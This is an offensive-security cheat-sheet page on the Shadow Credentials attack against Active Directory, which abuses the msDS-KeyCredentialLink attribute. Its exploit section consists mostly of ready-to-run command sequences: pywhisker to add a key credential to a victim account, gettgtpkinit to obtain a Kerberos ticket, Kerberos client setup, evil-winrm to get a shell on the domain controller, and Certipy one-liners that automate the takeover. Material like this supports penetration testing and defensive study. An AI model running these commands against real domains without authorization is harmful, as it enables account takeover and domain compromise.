# Shadow Credentials (msDS-KeyCredentialLink)

{% hint style="info" %}
[Shadow Credentials](https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab) refers to an Active Directory attack that abuses the [msDS-KeyCredentialLink](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/f70afbcc-780e-4d91-850c-cfadce5bb15c) attribute of a victim user. This attribute stores public keys that can be used for authentication via PKINIT. In BloodHound, the `AddKeyCredentialLink` edge indicates that one user has write permissions over another user's `msDS-KeyCredentialLink` attribute, allowing them to take control of that user.
{% endhint %}

#### Exploit Steps

{% tabs %}
{% tab title="pywhisker,gettgtpkinit" %}
* <pre class="language-bash" data-line-numbers><code class="lang-bash">python3 pywhisker --dc-ip &#x3C;IP> -d &#x3C;domain> -u &#x3C;user> -p &#x3C;pass> --target &#x3C;victim-user> --action add
  pip3 install -I git+https://github.com/wbond/oscrypto.git
  python3 gettgtpkinit.py -cert-pfx ../file.pfx -pfx-pass '&#x3C;pass>' -dc-ip &#x3C;IP> &#x3C;domain>/&#x3C;victim-username> /tmp/&#x3C;username>.ccachez
  </code></pre>
* `sudo apt-get install krb5-user -y`
* `sudo nano /etc/krb5.conf`
  *   `[libdefaults]`\
      `default_realm = <domain>`

      `[realms]`\
      `domain = {`\
      `kdc = <DC-FQDN>`\
      `}`
* Update `/etc/hosts` file for DC or other server FQDN resolutions
* `export KRB5CCNAME=/tmp/<username>.ccache`
* `klist`
* `evil-winrm -i <DC-FQDN> -r <domain>`
{% endtab %}

{% tab title="Certipy" %}
{% code lineNumbers="true" %}
```bash
certipy shadow auto -u <username>@<domain> -p <password> -account <target-user> -dc-ip <IP>
certipy shadow auto -u <username>@<domain> -hashes :<NTHASH> -account  <target-user> -dc-ip <IP>
```
{% endcode %}
{% endtab %}
{% endtabs %}

### Tools

* [pywhisker](https://github.com/ShutdownRepo/pywhisker)
* [gettgtpkinit.py](https://github.com/dirkjanm/PKINITtools/blob/master/gettgtpkinit.py)

### References

* [specterops-shadow credentials abusing key trust account mapping for account takeover](https://specterops.io/blog/2021/06/17/shadow-credentials-abusing-key-trust-account-mapping-for-account-takeover/)
